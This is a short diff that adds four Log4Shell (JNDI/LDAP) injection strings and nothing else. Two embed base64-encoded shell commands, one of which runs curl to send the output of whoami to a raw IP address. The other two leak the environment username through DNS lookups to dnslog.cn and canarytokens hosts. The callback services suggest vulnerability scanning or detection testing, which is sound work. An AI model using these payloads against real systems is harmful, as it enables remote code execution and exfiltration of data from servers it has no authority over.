@@ -1,0 +1,4 @@
+${jndi:ldap://h0k9227wwl45ptknqnaxsad38.canarytokens.com/Basic/Command/Base64/Y3VybCBodHRwOi8vMTY3LjcxLjE5OC4yMjQvYHdob2FtaWA=}
+${jndi:ldap://${env:user}.wlfu38.dnslog.cn/a}
+${jndi:ldap://h0k9227wwl45ptknqnaxsad38.canarytokens.com/Basic/Command/Base64/YHdoaWNoIGN1cmxgIC1zIGh0dHA6Ly9jYW5hcnl0b2tlbnMuY29tL3Rlcm1zL3Fsb3cwMWF0dDY0ZmZ4eG1ucDl1aWk2ZjYvaW5kZXguaHRtbAo=}
+${jndi:ldap://${env:user}.h0k9227wwl45ptknqnaxsad38.canarytokens.com/${env:user}}
